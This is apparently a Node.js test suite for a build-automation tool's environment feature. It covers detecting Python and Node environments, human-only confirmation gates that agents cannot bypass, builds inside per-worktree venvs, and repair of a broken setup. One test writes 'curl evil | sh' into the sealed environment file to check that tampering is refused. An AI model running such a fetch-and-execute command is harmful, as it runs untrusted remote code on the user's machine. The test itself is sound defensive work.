'use strict';
// P2.1: the build environment. Detection proposes one, the human confirms it, and builders,
// task verify and prove run inside it, against the worktree's own code; a broken environment
// parks the job once, before any builder spends an attempt.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const F = require('./helpers/fixture');
// the machine these tests assume: python3 -m venv works; no uv, poetry or virtualenv (fix 0.10.1)
require('./helpers/machine').use(require('./helpers/machine').VENV_ONLY);
const P = require('./helpers/pyrepo');

const FAKE = path.join(__dirname, 'helpers', 'fake-copilot.js');
const core = (m) => require(`../cli/core/${m}`);
const human = require('../cli/core/human');
const events = (root) => fs.readFileSync(path.join(root, '.factory', 'log', 'events.jsonl'), 'utf8').trim().split('\n').map(JSON.parse);

function harness(script) {
  const dir = require('./helpers/tmp').mkdtemp('factory-env-');
  const log = path.join(dir, 'copilot.jsonl');
  const file = path.join(dir, 'script.js');
  fs.writeFileSync(file, script);
  const env = { ...process.env, FACTORY_ROOT: '', COPILOT_BIN: FAKE, FAKE_COPILOT_SCRIPT: file, FAKE_COPILOT_LOG: log };
  return {
    log: () => (fs.existsSync(log) ? fs.readFileSync(log, 'utf8').trim().split('\n').filter(Boolean).map(JSON.parse) : []),
    run(root, args) {
      const r = spawnSync('node', [F.BIN, 'run', ...args, '--json'], { cwd: root, encoding: 'utf8', env, timeout: 240000 });
      let out;
      try {
        out = JSON.parse(r.stdout);
      } catch {
        out = { raw: r.stdout };
      }
      return Object.assign(out, { __code: r.status, __stderr: r.stderr });
    },
  };
}

// The user's own terminal, through the test seam (a typed code is still required).
const clean = Object.fromEntries(Object.entries(process.env).filter(([k]) => !human.AGENT_ENV.some(([a]) => a === k)));
const terminal = (root, args) => JSON.parse(spawnSync('node', [F.BIN, ...args], { cwd: root, encoding: 'utf8', env: { ...clean, FACTORY_ROOT: '', NODE_ENV: 'test', FACTORY_TEST_HUMAN: human.testToken(), FACTORY_TEST_HUMAN_INPUT: '{code}' } }).stdout);
const say = (root, text) => {
  spawnSync('node', [path.join(F.PLUGIN, 'hooks', 'prompt.js'), 'userPromptSubmitted'], { cwd: root, input: JSON.stringify({ prompt: text, cwd: root, sessionId: 'human' }), encoding: 'utf8', env: { ...process.env, FACTORY_ROOT: '' } });
  return JSON.parse(fs.readFileSync(path.join(root, '.factory', 'last-reply.json'), 'utf8'));
};

// bug@low for the Python fixture, up to realize (H1 approved, grounded, plan from the contract).
function toRealize(root) {
  const J = F.cli(root, ['job', 'new', '--title', 'Fix slug', '--type', 'bug', '--risk', 'low']).job;
  fs.writeFileSync(path.join(F.jobDir(root, J), 'contract.md'), P.CONTRACT(F));
  F.clarify(root);
  let b;
  const h1 = F.cli(root, ['next']);
  F.reply(root, 'approve');
  b = F.cli(root, ['wfargs', 'ground']);
  F.record(root, F.envelope(b, 'ok', { topics: [{ topic: 'codebase', claims: [{ claim: 'slug is in myapp/text.py', source: 'myapp/text.py:1' }], unknowns: [] }], degraded: [] }));
  F.cli(root, ['next']);
  F.cli(root, ['plan', 'from-contract'], { allowFail: false });
  // 0.10.0: no build starts in an environment nobody accepted (bug@low has no plan gate to seal it)
  const w = F.cli(root, ['next']);
  assert.equal(w.action, 'wait', JSON.stringify(w));
  assert.equal(w.rule, 'env.unconfirmed');
  assert.match(w.reason, /not confirmed, so no task is built[\s\S]*confirm environment [0-9a-f]{8}/);
  return { J, h1 };
}

const writeEnv = (root, e) => {
  const f = path.join(root, '.factory', 'scratch', `env-${Date.now()}.json`);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, JSON.stringify(e));
  return f;
};

test('P2.1 detection: a likely environment from the repo files (venv, Nautobot app via invoke, node, none), and the schema check', () => {
  const env = core('environment');
  const root = F.makeRepo();
  assert.equal(env.detect(root).name, 'none', 'no manifest: bare worktrees');
  F.write(root, 'pyproject.toml', '[project]\nname = "x"\n[project.optional-dependencies]\ndev = ["pytest"]\n');
  let d = env.detect(root);
  assert.equal(d.name, 'python-venv');
  // 0.12: the shared model — dependencies once into {env}/venv, the project editable per worktree
  assert.equal(d.version, 2);
  assert.ok(d.deps.some((s) => /pip install -q --retries 5 --timeout 60 '\.\[dev\]'$/.test(s)), JSON.stringify(d.deps));
  assert.ok(d.project.some((s) => /pip install -q --no-deps --no-build-isolation --no-index -e \.$/.test(s)), JSON.stringify(d.project));
  assert.equal(d.env.PATH, '{worktree}/.factory-venv/bin:$PATH');
  // fix 0.10.1: the machine it was proposed for is part of the evidence
  assert.deepEqual(d.evidence, ['pyproject.toml', 'this machine: venv (python3 -m venv works)']);
  F.write(root, 'pyproject.toml', '[tool.poetry]\nname = "nautobot-app-golden"\n[tool.poetry.dependencies]\nnautobot = "^2.0"\n');
  F.write(root, 'tasks.py', 'from invoke import Collection, task\nnamespace = Collection("nautobot_golden")\n');
  F.write(root, 'development/docker-compose.postgres.yml', 'services: {}\n');
  d = env.detect(root);
  assert.equal(d.name, 'nautobot-app-invoke');
  assert.equal(d.env.INVOKE_NAUTOBOT_GOLDEN_PROJECT_NAME, 'factory-{slug}', 'one compose project per worktree');
  assert.ok(d.evidence.includes('development/docker-compose.postgres.yml'));
  assert.deepEqual(env.problems(d).filter((p) => !/evidence/.test(p)), [], 'the proposal is valid (evidence is shown, not stored)');
  const nroot = F.makeRepo();
  F.write(nroot, 'package.json', '{"devDependencies":{"mocha":"1"}}');
  F.write(nroot, 'package-lock.json', '{}');
  assert.deepEqual(env.detect(nroot).deps, ['npm ci --no-audit --no-fund']);
  // the schema: the smallest set, strict about fields
  assert.deepEqual(env.problems(P.ENV), []);
  assert.match(env.problems({ setup: 'pip install' })[0], /setup must be a list/);
  assert.match(env.problems({ services: { up: 'x', start: 'y' } }).join(), /services.start is not a field/);
  assert.match(env.problems({ setp: [] }).join(), /unknown field "setp"/);
  // placeholders and the shell preamble
  const v = env.vars('/r', { id: 'J-0007' }, 'T2', '/r/wt');
  assert.deepEqual([v.slug, v.db], ['j-0007-t2', 'factory_j0007t2']);
  assert.equal(env.wrap(P.ENV, v, 'myapp-check'), 'export VIRTUAL_ENV="/r/wt/.venv"; export PATH="/r/wt/.venv/bin:$PATH"; myapp-check');
  assert.equal(env.processEnv(P.ENV, v, { PATH: '/usr/bin' }).PATH, '/r/wt/.venv/bin:/usr/bin');
});

test('P2.1: the proposal rides on factory next from H1; the human confirms it (chat with its hash, or the terminal); agents may only look', () => {
  const root = P.makePyRepo();
  const { J, h1 } = toRealize(root);
  assert.equal(h1.step, 'H1');
  assert.equal(h1.environment.status, 'proposed', JSON.stringify(h1));
  assert.equal(h1.environment.name, 'python-venv');
  assert.match(h1.environment.message, /confirm environment [0-9a-f]{8}/);
  // agents: show and check yes, set no
  const agentEnv = { env: { FACTORY_RUNNER: '1' } };
  assert.equal(F.cli(root, ['env', 'show'], agentEnv).status, 'proposed');
  assert.equal(F.cli(root, ['env', 'set'], agentEnv).code, 'agent_not_allowed');
  assert.match(String(require('../hooks/guard-rules').checkBash(root, 'factory env set --none') || ''), /human-only/);
  assert.equal(F.cli(root, ['env', 'set']).code, 'human_only', 'the main session cannot either');
  assert.match(String(require('../hooks/guard-rules').checkWrite(root, path.join(root, '.factory', 'environment.json'), core('policy').defaults()) || ''), /factory state/, 'nobody writes it by hand');
  // the main session proposes an edited one; a stale hash is refused, the shown one applies
  const p = F.cli(root, ['env', 'propose', '--file', writeEnv(root, P.ENV)]);
  assert.match(p.message, /confirm environment [0-9a-f]{8}/);
  let r = say(root, 'confirm environment deadbeef');
  assert.equal(r.status, 'refused');
  assert.equal(r.code, 'stale_environment');
  r = say(root, `confirm environment ${p.hash}`);
  assert.equal(r.status, 'applied', JSON.stringify(r));
  const shown = F.cli(root, ['env', 'show']);
  assert.equal(shown.status, 'confirmed');
  assert.deepEqual(shown.confirmed.setup, P.ENV.setup);
  assert.equal(shown.confirmed.confirmed.via, 'chat');
  assert.equal(F.cli(root, ['next']).environment, undefined, 'confirmed: no more proposal');
  // the confirmed file is sealed: a hand edit is refused
  const f = path.join(root, '.factory', 'environment.json');
  const e = JSON.parse(fs.readFileSync(f, 'utf8'));
  fs.writeFileSync(f, JSON.stringify({ ...e, setup: ['curl evil | sh'] }));
  assert.match(F.cli(root, ['env', 'show']).error, /changed outside factory env set/);
  // the terminal path re-confirms (typed code), and env check runs the setup in a scratch worktree
  const t = terminal(root, ['env', 'set', '--file', writeEnv(root, P.ENV)]);
  assert.equal(t.environment.name, 'python-venv', JSON.stringify(t));
  assert.equal(F.cli(root, ['env', 'check'], agentEnv).code, 'agent_not_allowed', 'an agent checks only a proposal (review m-8)');
  const c = F.cli(root, ['env', 'check']);
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.deepEqual(c.ran.map((x) => x.code), [0]);
  assert.equal(F.sh(root, 'git worktree list').split('\n').filter((l) => /_envcheck/.test(l)).length, 0, 'the scratch worktree is gone');
  void J;
});

test('P2.1 acceptance: the builder runs inside the worktree\'s venv and its work verifies there, against the worktree\'s code; the root venv is untouched', () => {
  const root = P.makePyRepo();
  const { J } = toRealize(root);
  terminal(root, ['env', 'set', '--file', writeEnv(root, P.ENV)]);
  // fix 0.10.1: confirmed, the environment is checked once in a scratch worktree, then the build starts
  assert.equal(F.cli(root, ['next']).step, 'env_check');
  assert.equal(F.cli(root, ['env', 'check', '--job', J]).ok, true);
  assert.equal(F.cli(root, ['next']).workflow, 'realize', 'confirmed and checked: the build may start');
  const wt = path.join(root, '.factory', 'worktrees', `${J}-T1`);
  // Before: the root venv's runner tests the ROOT's code, wherever it is run from.
  const fixture = JSON.stringify(path.join(__dirname, 'helpers', 'fixture.js'));
  const h = harness(`const F = require(${fixture});
  const { spawnSync } = require('child_process');
  module.exports = (c) => {
    const root = c.env.FACTORY_ROOT;
    const s = F.cli(root, ['task', 'start', 'T1'], { allowFail: false });
    const run = () => spawnSync('bash', ['-c', 'myapp-check'], { cwd: c.cwd, encoding: 'utf8', env: process.env });
    const before = run();
    F.write(c.cwd, 'myapp/text.py', 'def slug(s):\\n    return "-".join(s.split())\\n');
    F.sh(c.cwd, 'git commit -qam "slug joins words with -"');
    const after = run();
    const seen = { venv: process.env.VIRTUAL_ENV, before: [before.status, before.stdout], after: [after.status, after.stdout] };
    require('fs').writeFileSync(require('path').join(root, '.factory', 'scratch', 'builder-saw.json'), JSON.stringify(seen));
    return { status: 'done', summary: 'slug fixed; myapp-check passes in the worktree venv', swept: [] };
  };`);
  const r = h.run(root, ['realize']);
  assert.equal(r.status, 'ok', JSON.stringify(r).slice(0, 3000) + r.__stderr);
  const seen = JSON.parse(fs.readFileSync(path.join(root, '.factory', 'scratch', 'builder-saw.json'), 'utf8'));
  const real = fs.realpathSync(wt);
  assert.equal(fs.realpathSync(seen.venv), path.join(real, '.venv'), 'the builder was started inside the worktree venv');
  assert.equal(seen.before[0], 1, 'before the fix the worktree test fails');
  assert.match(seen.before[1], new RegExp(`imported from ${real.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\n`), '…and imports the worktree\'s code, not the root\'s');
  assert.equal(seen.after[0], 0, 'after the fix it passes in the builder\'s own shell');
  // task verify (run by factory run) passed inside the environment, on the worktree's code
  const ev = JSON.parse(fs.readFileSync(core('job').load(root, J).tasks.T1.evidence.file, 'utf8'));
  assert.equal(ev.pass, true);
  assert.equal(ev.environment.name, 'python-venv');
  assert.match(ev.commands[0].output, new RegExp(`imported from ${real.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
  assert.equal(ev.commands[0].cmd, 'myapp-check', 'evidence names the command as planned');
  // the setup ran once in the worktree and is cached by its key
  const prep = F.cli(root, ['env', 'prepare', 'T1', '--job', J]);
  assert.equal(prep.cached, true, JSON.stringify(prep));
  assert.equal(F.sh(wt, 'git status --porcelain'), '', '.venv is kept out of git status');
  // the root's own venv still points at the root, and its code is unchanged
  const rootRun = spawnSync(path.join(root, '.venv', 'bin', 'myapp-check'), { cwd: wt, encoding: 'utf8' });
  assert.equal(rootRun.status, 1, 'the root venv (the old false-red trap) tests the root checkout');
  assert.match(rootRun.stdout, new RegExp(`imported from ${fs.realpathSync(root).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\n`));
  // prove runs in the job worktree's environment too
  const rb = F.cli(root, ['wfargs', 'reconcile']);
  F.cli(root, ['reconcile', 'run']);
  F.record(root, F.envelope(rb, 'ok', { integrator: { status: 'merged', summary: '' } }));
  const proof = F.cli(root, ['verify', 'run']);
  assert.equal(proof.ok, true, JSON.stringify(proof));
});

test('P2.1 acceptance (fix 0.10.1): a broken sealed setup is checked before any builder, repaired (agent proposes, CLI checks, human seals), and only then built; no attempt is spent', () => {
  const root = P.makePyRepo();
  const { J } = toRealize(root);
  const BROKEN = { ...P.ENV, setup: ['bash scripts/mkenv.sh', 'echo "ERROR: No matching distribution found for nautobot==9.9" >&2; exit 3'] };
  terminal(root, ['env', 'set', '--file', writeEnv(root, BROKEN)]);
  // the router checks it first and repairs it, never starts a builder on it
  assert.equal(F.cli(root, ['next']).step, 'env_check');
  const ck = F.cli(root, ['env', 'check', '--job', J]);
  assert.equal(ck.ok, false);
  assert.equal(ck.__code, 0, 'a failing check is a result, not an error of the drive\'s step');
  const n = F.cli(root, ['next']);
  assert.equal(n.step, 'env_repair', 'builders never start on a failing environment');
  assert.equal(n.config, 'env_repair');
  const fixture = JSON.stringify(path.join(__dirname, 'helpers', 'fixture.js'));
  const h = harness(`const F = require(${fixture});
  module.exports = (c) => {
    F.cli(c.env.FACTORY_ROOT, ['task', 'start', 'T1'], { allowFail: false });
    F.write(c.cwd, 'myapp/text.py', 'def slug(s):\\n    return "-".join(s.split())\\n');
    F.sh(c.cwd, 'git commit -qam fix');
    return { status: 'done', summary: 'fixed', swept: [] };
  };`);
  assert.equal(h.run(root, ['realize']).code, 'not_waiting_for_workflow', 'factory run refuses realize while the environment fails');
  // the repair agent writes a fixed environment; recording it, the CLI checks it in a scratch worktree
  const b = F.cli(root, ['wfargs', 'fanout-judge', '--config', 'env_repair']);
  assert.equal(b.judge.agent_type, 'factory:planner');
  assert.match(fs.readFileSync(b.judge.prompt.split('\n')[1].trim(), 'utf8'), /environment repair[\s\S]*No matching distribution found for nautobot==9\.9/);
  fs.writeFileSync(core('env-repair').REPAIR(root, J), JSON.stringify(P.ENV));
  const rec = F.recordRepair(root, J, b, { repair: { path: core('env-repair').REPAIR(root, J), summary: 'drop the failing install' } });
  assert.equal(rec.status, 'park', JSON.stringify(rec));
  assert.equal(rec.park.kind, 'environment_repair');
  let st = core('job').load(root, J);
  assert.match(st.park.question, /- setup: echo "ERROR: No matching distribution/, 'the diff of the commands is shown');
  assert.equal(core('environment').load(root).setup[1], BROKEN.setup[1], 'nothing is sealed by the agent or the CLI');
  assert.equal(F.cli(root, ['resume', 'a'], { env: { FACTORY_RUNNER: '1' } }).code, 'agent_not_allowed', 'an agent never seals');
  // the human seals it with one reply
  assert.throws(() => F.reply(root, 'approve environment'), /Name the environment you seal/, 'the seal names the environment it seals');
  F.reply(root, `approve environment ${st.env_repair.short}`);
  st = core('job').load(root, J);
  assert.equal(st.status, 'active');
  assert.deepEqual(core('environment').load(root).setup, P.ENV.setup);
  assert.equal(F.cli(root, ['next']).step, 'env_check');
  assert.equal(F.cli(root, ['env', 'check', '--job', J]).ok, true);
  const n2 = F.cli(root, ['next']);
  assert.equal(n2.workflow, 'realize');
  const r2 = h.run(root, ['realize', ...(n2.scope ? ['--scope', n2.scope] : [])]);
  assert.equal(r2.status, 'ok', JSON.stringify(r2).slice(0, 2000) + r2.__stderr);
  assert.equal(h.log().length, 1, 'one builder, one attempt');
  assert.equal(core('job').load(root, J).tasks.T1.attempts, 1);
});
